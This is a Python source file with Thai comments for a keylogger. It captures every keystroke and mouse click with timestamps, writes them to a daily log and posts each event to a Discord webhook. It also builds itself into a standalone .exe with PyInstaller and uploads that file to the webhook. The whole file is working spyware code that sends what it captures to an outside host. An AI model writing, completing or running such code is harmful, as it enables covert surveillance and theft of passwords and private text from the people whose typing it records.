from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import logging
import datetime
import requests
import os

# กำหนดไดเรกทอรีที่บันทึกไฟล์
log_dir = ""  # สามารถกำหนดเป็นไดเรกทอรีที่ต้องการ หรือเว้นว่างไว้เพื่อบันทึกในไดเรกทอรีปัจจุบัน

# กำหนดรูปแบบไฟล์ล็อกที่มีชื่อแตกต่างกันในแต่ละวัน
log_filename = f"{log_dir}keylogs_{datetime.datetime.now().date()}.txt"

# กำหนดการตั้งค่าการบันทึกข้อมูล
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# กำหนด Webhook URL ของ Discord
discord_webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'  # แทนที่ 'YOUR_DISCORD_WEBHOOK_URL' ด้วย URL Webhook ของคุณ

# ตัวแปรที่ใช้ควบคุมการส่งข้อมูลไปที่ Discord
send_to_discord_enabled = True  # เปลี่ยนเป็น False เพื่อปิดการส่งข้อความไปที่ Discord

# ฟังก์ชันที่ใช้ส่งข้อความไปที่ Discord
def send_to_discord(message, file_path=None):
    if send_to_discord_enabled:  # เช็คค่าตัวแปรเพื่อเปิดหรือปิดการส่งข้อมูล
        data = {"content": message}  # ข้อความที่จะส่งไปที่ Discord

        files = {}
        if file_path and os.path.exists(file_path):
            files = {"file": open(file_path, "rb")}

        response = requests.post(discord_webhook_url, data=data, files=files)
        if response.status_code != 204:
            print("เกิดข้อผิดพลาดในการส่งข้อความไปที่ Discord:", response.status_code)

# ฟังก์ชันที่ใช้บันทึกการกดปุ่ม
def on_press(key):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        # ถ้ากดปุ่มตัวอักษร หรือ ตัวเลข
        message = f"ผู้ใช้กดปุ่ม '{key.char}' เวลา {timestamp}"
        logging.info(message)
        send_to_discord(message)  # ส่งข้อความไปที่ Discord
    except AttributeError:
        # ถ้ากดปุ่มพิเศษ
        if key == Key.space:
            message = f"ผู้ใช้กดปุ่ม 'Space' เวลา {timestamp}"
        elif key == Key.enter:
            message = f"ผู้ใช้กดปุ่ม 'Enter' เวลา {timestamp}"
        elif key == Key.shift:
            message = f"ผู้ใช้กดปุ่ม 'Shift' เวลา {timestamp}"
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            message = f"ผู้ใช้กดปุ่ม 'Ctrl' เวลา {timestamp}"
        elif key == Key.alt_l or key == Key.alt_r:
            message = f"ผู้ใช้กดปุ่ม 'Alt' เวลา {timestamp}"
        elif key == Key.esc:
            message = f"ผู้ใช้กดปุ่ม 'Esc' เวลา {timestamp}"
        else:
            message = f"ผู้ใช้กดปุ่มพิเศษ: {key} เวลา {timestamp}"
        
        logging.info(message)
        send_to_discord(message)  # ส่งข้อความไปที่ Discord

# ฟังก์ชันที่ใช้บันทึกการคลิกเมาส์
def on_click(x, y, button, pressed):
    if pressed:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"ผู้ใช้คลิกที่ตำแหน่ง ({x}, {y}) ด้วยปุ่ม {button} เวลา {timestamp}"
        logging.info(message)
        send_to_discord(message)  # ส่งข้อความไปที่ Discord

# ฟังก์ชันสำหรับสร้างไฟล์ .exe ด้วย PyInstaller
def create_exe():
    # สร้างไฟล์ .exe จากสคริปต์นี้
    os.system('pyinstaller --onefile your_script_name.py')  # เปลี่ยนชื่อไฟล์เป็นชื่อของสคริปต์

    # หาตำแหน่งที่สร้างไฟล์ .exe
    exe_file = 'dist/your_script_name.exe'  # เปลี่ยนชื่อไฟล์เป็นชื่อที่ถูกต้อง

    # ตรวจสอบขนาดของไฟล์ .exe
    if os.path.exists(exe_file):
        exe_size = os.path.getsize(exe_file)
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"ไฟล์ EXE ถูกสร้างแล้ว: {exe_file} (ขนาด: {exe_size / 1024:.2f} KB) เวลา {timestamp}"
        send_to_discord(message, exe_file)  # ส่งไฟล์ .exe ไปที่ Discord

        # ลบไฟล์ที่ไม่จำเป็นหลังจากส่งไป Discord
        os.remove(exe_file)

# เริ่มทำงาน
if __name__ == "__main__":
    create_exe()  # เรียกใช้ฟังก์ชันเพื่อสร้าง .exe และส่งไปที่ Discord
    with Listener(on_press=on_press) as keyboard_listener, MouseListener(on_click=on_click) as mouse_listener:
        keyboard_listener.join()
        mouse_listener.join()